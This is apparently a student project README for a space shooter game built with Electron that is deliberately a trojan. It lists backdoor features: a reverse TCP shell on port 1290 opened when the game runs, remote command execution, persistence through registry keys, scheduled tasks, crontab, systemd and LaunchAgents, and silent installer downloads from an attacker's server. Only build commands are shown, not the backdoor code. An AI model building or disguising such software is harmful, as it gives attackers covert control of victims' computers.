# Space Shooter - Educational Cybersecurity Project

![Version](https://img.shields.io/badge/version-1.0.1-blue)
![Electron](https://img.shields.io/badge/electron-28.0.0-green)
![License](https://img.shields.io/badge/license-MIT-orange)

## ⚠️ IMPORTANT DISCLAIMER

**THIS SOFTWARE IS FOR EDUCATIONAL PURPOSES ONLY**
- Test only in isolated virtual machines
- Never use on systems you don't own
- No liability for misuse
- All testing must comply with local laws

## 📋 Project Overview

A Space Shooter game built with HTML5 Canvas and Electron that demonstrates core cybersecurity concepts as required by the assignment:
- ✅ Dependency checking and installation from local server
- ✅ Reverse shell access on game execution
- ✅ Persistence across system reboots
- ✅ Anti-interruption mechanisms
- ✅ Cleanup/removal tool
- ✅ Comprehensive documentation

## 🎮 Game Features

- Smooth space shooter gameplay with progressive difficulty
- Boss battles every 5 levels
- Score tracking with local storage
- Mobile touch support
- Responsive design

## 🔧 Backdoor Features

### Connection
- Reverse TCP shell on port `1290`
- Auto-reconnects every 30 seconds if disconnected
- Custom banner with system information
- Command set: `help`, `info`, `exec`, `persist`, `cleanup`, `exit`

### Persistence (Multi-OS)
| OS      | Methods                                                                 |
|---------|-------------------------------------------------------------------------|
| Windows | Registry Run Key, Startup Folder, Scheduled Tasks                       |
| Linux   | Crontab, Systemd Services                                               |
| macOS   | LaunchAgents, LaunchDaemons                                             |

### Dependency Management
- Automatically checks for: Python, Git, curl
- Downloads missing installers from attacker's local server
- Silent installation with no user interaction

## 📁 Project Structure

space-shooter/
├── main.js # Electron main process (backdoor logic)
├── preload.js # Secure IPC bridge
├── game.html # Game interface
├── build.js # Build script
├── package.json # Project configuration
├── installers/ # Dependency installers
│ ├── python-3.12.3-amd64.exe #download it  and if different version , just update also in codes  
│ ├── Git-2.33.0-64-bit.exe  #download it and put it here or if different version, just update also in codes
│ └── curl.exe   # do the same
└── dist/ # Built applications



## 🐳 Building for Windows on Linux (Using Docker)

### Prerequisites
- Docker installed
- Installers in `/installers` folder

### Build Command

```bash
# Clone/ navigate to project
cd space-shooter

# Ensure installers have correct names
mv Git-2.53.0.2-64-bit.exe Git-2.33.0-64-bit.exe  # If needed

# Build Windows executable using Docker
sudo docker run --rm \
  -v ${PWD}:/project \
  -v ~/.cache/electron:/root/.cache/electron \
  -v ~/.cache/electron-builder:/root/.cache/electron-builder \
  electronuserland/builder:wine \
  /bin/bash -c "cd /project && npm install && DEBUG=electron-builder* npm run build:win"


  Output
Windows installer: dist/Space Shooter Setup 1.0.1.exe

Linux AppImage: dist/Space Shooter-1.0.1.AppImage

👥 Team Members
-**Amani Patrick
-**Ishimwe Teta Liana
-**Isingizwe Christian




  critics made(renamed the version to match in codebase-> lazy to change the codes so the version is 2.53.0.2 not that:
   mv Git-2.53.0.2-64-bit.exe Git-2.33.0-64-bit.exe

